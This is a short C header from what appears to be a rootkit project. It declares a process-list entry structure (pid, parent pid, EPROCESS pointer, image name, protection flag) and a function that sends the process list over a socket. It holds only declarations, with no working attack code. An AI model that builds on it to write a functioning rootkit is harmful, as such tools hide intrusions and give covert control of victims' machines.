#pragma once

typedef struct _ROOTKIT_PROCESS_ENTRY {
	LIST_ENTRY Entry;
	UINT32 pid;
	UINT32 ppid;
	ULONG_PTR Eprocess;
	CHAR ProcessCreationTime[260];
	CHAR ImageFileName[50];
	BOOLEAN IsProcessProtected;
}ROOTKIT_PROCESS_ENTRY, *PROOTKIT_PROCESS_ENTRY;

typedef struct _ROOTKIT_PROCESS_LIST_HEAD {

	ULONG NumberOfProcesses;
	LIST_ENTRY Entry;
}ROOTKIT_PROCESS_LIST_HEAD, *PROOTKIT_PROCESS_LIST_HEAD;

BOOL rootkit_get_processes(IN SOCKET sock, IN BYTE PacketType);